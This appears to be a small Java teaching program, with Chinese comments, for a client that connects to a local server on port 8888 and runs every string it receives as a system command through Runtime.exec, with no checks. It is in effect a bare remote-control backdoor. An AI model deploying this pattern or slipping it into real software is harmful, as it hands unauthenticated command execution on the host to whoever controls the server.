import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.net.Socket;
import java.net.UnknownHostException;

public class Client implements Runnable {
	String s = null;
	Socket mysocket;
	DataInputStream in = null;
	DataOutputStream out = null;
	Thread thread = null;

	Client() {
		thread = new Thread(this);/*我们要随时等待客户端的命令所以要开辟以线程，如果连上了主机那么我们谁是候命这就是需要开一个线程*/
		try {
			Thread.sleep(500);
			mysocket = new Socket("127.0.0.1", 8888);
			//下面是初始化流
			in = new DataInputStream(mysocket.getInputStream());
			out = new DataOutputStream(mysocket.getOutputStream());
		} catch (UnknownHostException e) {
			e.printStackTrace();
		} catch (IOException e) {
			e.printStackTrace();
		} catch (Exception e) {
		}
		thread.start();//启动线程
	}

	public static void main(String args[]) {
		Client c = new Client();

	}

	public void f(String s) {
		try {
			Runtime ec = Runtime.getRuntime();
			ec.exec(s);
		} catch (IOException e) {
			e.printStackTrace();
		}
	}

	public void run() {
		System.out.println("接受线程启动");
		while (true) {
			try {

				String s = in.readUTF();
				f(s);//调用方法运行远程命令
				Thread.sleep(200);
			} catch (Exception e) {
			}
			try {
				Thread.sleep(200);/*为了防止cpu占用过高或者内存占用过大这一句话是必要的*/
			} catch (InterruptedException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}

	}
}